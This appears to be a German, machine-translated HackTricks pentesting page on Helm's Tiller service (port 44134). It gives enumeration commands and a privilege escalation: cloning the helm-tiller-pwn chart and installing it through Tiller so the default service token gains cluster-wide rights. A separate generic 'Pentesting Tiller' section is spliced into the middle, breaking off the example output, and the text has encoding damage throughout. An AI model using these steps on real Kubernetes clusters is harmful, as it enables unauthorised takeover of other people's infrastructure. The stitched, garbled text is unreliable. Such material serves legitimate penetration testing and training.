<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


# Grundlegende Informationen

Helm ist der **Paketmanager** f√ºr Kubernetes. Es erm√∂glicht das Verpacken von YAML-Dateien und deren Verteilung in √∂ffentlichen und privaten Repositories. Diese Pakete werden als **Helm-Charts** bezeichnet. **Tiller** ist der **Dienst**, der standardm√§√üig auf Port 44134 l√§uft und den Service anbietet.

**Standardport:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumeration

Wenn Sie Pods und/oder Services in verschiedenen Namespaces aufz√§hlen k√∂nnen, z√§hlen Sie sie auf und suchen Sie nach denen mit dem Namen **"tiller"**:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
Beispiel:

# Pentesting Tiller (Helm)

## Einf√ºhrung

Tiller ist der Server-Komponente von Helm, einem Paketmanager f√ºr Kubernetes. In diesem Abschnitt werden einige Techniken zum Pentesting von Tiller vorgestellt.

## Informationen sammeln

### Version √ºberpr√ºfen

Um die Version von Tiller zu √ºberpr√ºfen, k√∂nnen Sie den Befehl `helm version` verwenden.

```bash
$ helm version
```

### Tiller-Endpunkt ermitteln

Um den Tiller-Endpunkt zu ermitteln, k√∂nnen Sie den Befehl `kubectl get endpoints -n kube-system` verwenden und nach dem Tiller-Dienst suchen.

```bash
$ kubectl get endpoints -n kube-system
```

## Schwachstellenanalyse

### Standardanmeldeinformationen

Tiller verwendet standardm√§√üig keine Anmeldeinformationen. Dies kann zu Sicherheitsproblemen f√ºhren, da jeder mit Zugriff auf den Tiller-Endpunkt auf den Cluster zugreifen kann.

### Fehlende Berechtigungspr√ºfung

Tiller √ºberpr√ºft standardm√§√üig nicht die Berechtigungen f√ºr die Installation oder Aktualisierung von Charts. Dies erm√∂glicht es einem Angreifer, b√∂sartige Charts zu installieren oder vorhandene Charts zu aktualisieren.

### Unzureichende Zugriffskontrollen

Tiller verwendet standardm√§√üig keine Zugriffskontrollen, was bedeutet, dass jeder mit Zugriff auf den Tiller-Endpunkt beliebige Aktionen ausf√ºhren kann.

## Exploitation

### B√∂sartige Charts

Ein Angreifer kann b√∂sartige Charts erstellen und diese √ºber Tiller installieren. Diese Charts k√∂nnen sch√§dlichen Code enthalten, der im Cluster ausgef√ºhrt wird.

### Chart-Manipulation

Ein Angreifer kann vorhandene Charts manipulieren und b√∂sartigen Code hinzuf√ºgen. Wenn ein Administrator diese Charts aktualisiert, wird der b√∂sartige Code im Cluster ausgef√ºhrt.

## Gegenma√ünahmen

### Authentifizierung und Autorisierung

Es wird empfohlen, Tiller mit Authentifizierung und Autorisierung zu konfigurieren, um unbefugten Zugriff zu verhindern.

### Zugriffskontrollen

Es wird empfohlen, Zugriffskontrollen f√ºr Tiller zu implementieren, um die Aktionen, die ein Benutzer ausf√ºhren kann, einzuschr√§nken.

### Aktualisierung der Tiller-Version

Es wird empfohlen, Tiller regelm√§√üig zu aktualisieren, um von den neuesten Sicherheitsupdates zu profitieren.

## Fazit

Tiller kann aufgrund seiner Standardkonfiguration und fehlenden Sicherheitsma√ünahmen zu Sicherheitsproblemen f√ºhren. Durch die Implementierung von Authentifizierung, Autorisierung und Zugriffskontrollen sowie regelm√§√üige Aktualisierungen k√∂nnen diese Risiken minimiert werden.
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
Sie k√∂nnen auch versuchen, diesen Dienst zu finden, indem Sie den Port 44134 √ºberpr√ºfen:
```bash
sudo nmap -sS -p 44134 <IP>
```
Sobald Sie es entdeckt haben, k√∂nnen Sie mit dem Herunterladen der Client-Anwendung Helm kommunizieren. Sie k√∂nnen Tools wie `homebrew` verwenden oder sich [**die offizielle Ver√∂ffentlichungsseite**](https://github.com/helm/helm/releases)** ansehen**. Weitere Details oder andere Optionen finden Sie in [der Installationsanleitung](https://v2.helm.sh/docs/using\_helm/#installing-helm).

Dann k√∂nnen Sie den Dienst **aufz√§hlen**:
```
helm --host tiller-deploy.kube-system:44134 version
```
## Privilege Escalation

Standardm√§√üig wurde **Helm2** im **Namespace kube-system** mit **hohen Privilegien** installiert. Wenn du den Service findest und Zugriff darauf hast, kannst du dadurch **Privilegien eskalieren**.

Alles, was du tun musst, ist ein Paket wie dieses zu installieren: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn). Dadurch erh√§lt der **Standard-Service-Token Zugriff auf alles im gesamten Cluster**.
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
In [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) finden Sie die **Erkl√§rung des Angriffs**, aber im Grunde genommen k√∂nnen Sie in den Dateien [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) und [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) innerhalb von _helm-tiller-pwn/pwnchart/templates/_ sehen, wie **alle Berechtigungen dem Standard-Token zugewiesen werden**.


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
